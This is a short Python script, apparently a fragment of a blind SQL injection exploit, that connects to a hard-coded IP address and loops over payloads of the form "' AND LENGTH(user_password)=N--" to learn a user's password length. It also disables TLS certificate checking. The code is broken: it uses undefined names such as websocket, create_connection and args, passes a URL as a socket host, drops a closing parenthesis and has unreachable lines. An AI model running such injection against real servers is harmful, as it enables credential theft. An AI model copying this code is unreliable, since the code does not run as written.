import sys
import ssl
import time
import json
import asyncio
import argparse
import websockets
import struct
import socket

#https://nilw324g.gradient.paperspace.com/lab/workspaces/auto-b

websocket.enableTrace(True)
ws=create_connection("ws://37.48.81.37:4989/ws")
 # no ssl verification
ssl_context = ssl.SSLContext()
ssl_context.verify_mode = ssl.CERT_NONE
ssl_context.check_hostname = False

def send_cti_with_length(sock, payload):
    to_send = struct.pack('>I', len(payload))
    to_send = to_send + payload
    sock.sendall(to_send)
    return recv_cti_with_length(sock)

def recv_cti_with_length(sock):
    length = sock.recv(4)
    length = struct.unpack('>I', length)[0]
    response = sock.recv(length)
    return response
    length = 0
while length < 100:
    rhost = "ws://37.48.81.37:4989/ws"
    rport = "4989"
    print('[+] Reaching out to ' + rhost + ':' + str(rport))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((rhost, str(rport))
    challenge_resp = send_cti_with_length(sock, b"action=challenge&user=" + args.user.encode('utf-8') + b"' AND LENGTH(user_password)=" + str(length).encode('utf-8') + b"--")
    inject_result = json.loads(challenge_resp)
    if (inject_result['status'] == 0):
        break
    else:
        length = length + 1

    sock.close()

